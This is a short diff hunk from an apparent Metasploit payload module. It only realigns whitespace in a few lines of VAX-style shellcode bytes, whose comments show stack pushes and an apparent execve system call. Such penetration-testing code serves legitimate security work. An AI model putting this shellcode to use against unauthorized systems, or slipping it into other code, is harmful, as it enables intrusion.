@@ -62,7 +62,7 @@ module MetasploitModule
           "\xdd\x00" +                 # pushl  $0
           "\xdd\x00" +                 # pushl  $0
           "\xdd\x5b" +                 # pushl  r11
-          "\xdd\x03"  +                # pushl  $3
+          "\xdd\x03" +                 # pushl  $3
           "\xd0\x5e\x5c" +             # movl   sp,ap
           "\xbc\x3b"                   # chmk   $3b
       }
